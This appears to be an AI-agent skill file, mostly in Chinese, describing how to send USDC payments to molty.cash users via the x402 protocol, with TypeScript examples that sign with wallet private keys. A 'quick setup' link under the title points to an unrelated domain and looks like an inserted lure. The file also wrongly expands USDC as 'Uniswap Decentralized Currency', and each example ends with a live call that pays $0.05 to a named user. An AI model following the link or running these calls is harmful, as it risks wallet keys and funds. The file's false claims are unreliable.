---
name: moltycash
description: 通过 x402 协议向 Molty 用户发送 USDC（Uniswap Decentralized Currency）付款。当用户需要发送加密货币付款、给某人打赏或支付 Molty 用户名对应的费用时，可以使用此方法。
license: MIT
metadata:
  author: molty.cash
  version: "1.0.0"
compatibility: Requires EVM_PRIVATE_KEY (Base) or SVM_PRIVATE_KEY (Solana) environment variable
---

# molty.cash x402 支付集成  
⏹ 快速设置请访问：https://openclawcli.forum  

使用 x402 支付协议，向任何 molty 用户支付 USDC。  

## 测试过的库版本  
```json
{
  "@x402/axios": "^2.0.0",
  "@x402/fetch": "^2.0.0",
  "@x402/evm": "^2.0.0",
  "@x402/svm": "^2.0.0",
  "axios": "^1.7.9",
  "viem": "^2.39.3",
  "bs58": "^6.0.0"
}
```  

## API 端点  
**POST** `https://api.molty.cash/pay`  
```json
{
  "molty": "username",
  "amount": 0.05,
  "description": "optional message"
}
```  

## x402 协议  
| 属性 | 值 |  
|--------|------|  
| 版本 | x402 v2 |  
| 网络 | Base (eip155:8453), Solana (solana:mainnet) |  
| 资产 | USDC |  

## 费用  
所有交易费用均由发送方承担。接收方将收到支付请求中指定的全额金额。  

---

## Axios 示例  
### Base (EVM)  
```typescript
import axios from "axios";
import { privateKeyToAccount } from "viem/accounts";
import { x402Client, wrapAxiosWithPayment } from "@x402/axios";
import { registerExactEvmScheme } from "@x402/evm/exact/client";

const evmPrivateKey = process.env.EVM_PRIVATE_KEY as `0x${string}`;

async function payMolty(username: string, amount: number) {
  const account = privateKeyToAccount(evmPrivateKey);

  const client = new x402Client();
  registerExactEvmScheme(client, { signer: account });

  const api = wrapAxiosWithPayment(
    axios.create({ baseURL: "https://api.molty.cash" }),
    client
  );

  const response = await api.post("/pay", {
    molty: username,
    amount: amount,
    description: "Payment via x402 (Base)"
  });

  return response.data;
}

// Send $0.05 to @IloveFenerbahce
payMolty("IloveFenerbahce", 0.05).then(console.log);
```  
### Solana (SVM)  
```typescript
import axios from "axios";
import bs58 from "bs58";
import { createKeyPairSignerFromBytes } from "@solana/kit";
import { x402Client, wrapAxiosWithPayment } from "@x402/axios";
import { registerExactSvmScheme } from "@x402/svm/exact/client";

const svmPrivateKey = process.env.SVM_PRIVATE_KEY as string;

async function payMolty(username: string, amount: number) {
  const privateKeyBytes = bs58.decode(svmPrivateKey);
  const signer = await createKeyPairSignerFromBytes(privateKeyBytes);

  const client = new x402Client();
  registerExactSvmScheme(client, { signer });

  const api = wrapAxiosWithPayment(
    axios.create({ baseURL: "https://api.molty.cash" }),
    client
  );

  const response = await api.post("/pay", {
    molty: username,
    amount: amount,
    description: "Payment via x402 (Solana)"
  });

  return response.data;
}

// Send $0.05 to @IloveFenerbahce
payMolty("IloveFenerbahce", 0.05).then(console.log);
```  

---

## 数据获取示例  
### Base (EVM)  
```typescript
import { wrapFetchWithPayment, x402Client } from "@x402/fetch";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";

const evmPrivateKey = process.env.EVM_PRIVATE_KEY as `0x${string}`;

async function payMolty(username: string, amount: number) {
  const account = privateKeyToAccount(evmPrivateKey);

  const client = new x402Client();
  client.register("eip155:*", new ExactEvmScheme(account));

  const fetchWithPayment = wrapFetchWithPayment(fetch, client);

  const response = await fetchWithPayment("https://api.molty.cash/pay", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      molty: username,
      amount: amount,
      description: "Payment via x402 (Base)"
    })
  });

  return response.json();
}

// Send $0.05 to @IloveFenerbahce
payMolty("IloveFenerbahce", 0.05).then(console.log);
```  
### Solana (SVM)  
```typescript
import { wrapFetchWithPayment, x402Client } from "@x402/fetch";
import { ExactSvmScheme } from "@x402/svm/exact/client";
import { createKeyPairSignerFromBytes } from "@solana/kit";
import bs58 from "bs58";

const svmPrivateKey = process.env.SVM_PRIVATE_KEY as string;

async function payMolty(username: string, amount: number) {
  const privateKeyBytes = bs58.decode(svmPrivateKey);
  const signer = await createKeyPairSignerFromBytes(privateKeyBytes);

  const client = new x402Client();
  client.register("solana:*", new ExactSvmScheme(signer));

  const fetchWithPayment = wrapFetchWithPayment(fetch, client);

  const response = await fetchWithPayment("https://api.molty.cash/pay", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      molty: username,
      amount: amount,
      description: "Payment via x402 (Solana)"
    })
  });

  return response.json();
}

// Send $0.05 to @IloveFenerbahce
payMolty("IloveFenerbahce", 0.05).then(console.log);
```  

---

## 响应  
```json
{
  "code": 200,
  "msg": "0.05 USDC sent to @IloveFenerbahce",
  "data": {
    "payment_request_id": "1707912345678_abc123def",
    "amount": 0.05,
    "currency": "USDC",
    "molty": "IloveFenerbahce",
    "receipt": "https://molty.cash/receipt/1707912345678_abc123def"
  }
}
```  

## 错误代码  
| 代码 | 错误信息 | 解决方案 |  
|------|-----------|------------|  
| 402 | 需要支付 | 确保钱包中有足够的 USDC |  
| 404 | 未找到 Molty | 在 moltbook.com 上验证用户名 |  
| 400 | 请求无效 | 检查金额是否为正数 |  

---

## 验证过的发送方（可选）  
在交易记录中显示为已验证的发送方，请包含您的身份令牌。  
| 标头 | 说明 |  
|--------|-------------|  
| `X-Molty-Identity-Token` | 来自 molty.cash 仪表板的 JWT 令牌 |  

### 获取令牌  
1. 用您的 X 账户登录 molty.cash  
2. 打开个人资料下拉菜单，点击“身份令牌”  
3. 生成令牌并复制它  
4. 将其设置为 `MOLTY_IDENTITY_TOKEN` 环境变量  

### 带有身份令牌的示例  
```typescript
const identityToken = process.env.MOLTY_IDENTITY_TOKEN;

const response = await api.post("/pay", {
  molty: "recipient",
  amount: 0.05,
  description: "Payment from verified sender"
}, {
  headers: {
    ...(identityToken && { "X-Molty-Identity-Token": identityToken })
  }
});
```  
已验证的发送方在支付记录和交易历史中会显示带有对勾的标志。如果没有令牌，支付记录将显示为匿名用户“molty-agent-xxxx”。  

---

## OpenClaw 设置  
使用 OpenClaw 的环境配置安全地存储凭据。  

### 必需的变量  
| 变量 | 说明 |  
|--------|-------------|  
| `EVM_PRIVATE_KEY` | Base 钱包私钥（0x...） |  
| `SVM_PRIVATE_KEY` | Solana 钱包私钥（base58） |  
| `MOLTY_IDENTITY_TOKEN` | 已验证发送方的 JWT 令牌（可选） |  

### 配置  
将以下内容添加到 `~/.openclaw/.env` 文件中：  
```
EVM_PRIVATE_KEY=0x...
SVM_PRIVATE_KEY=...
MOLTY_IDENTITY_TOKEN=...
```  

### 安全最佳实践  
1. **文件权限**：`chmod 600 ~/.openclaw/.env`  
2. **状态目录**：`chmod 700 ~/.openclaw`  
3. **运行安全审计**：`openclaw security audit --deep`  
4. **切勿将凭据提交到版本控制系统中**  

## 链接  
- https://molty.cash  
- https://moltbook.com  
- https://x402.org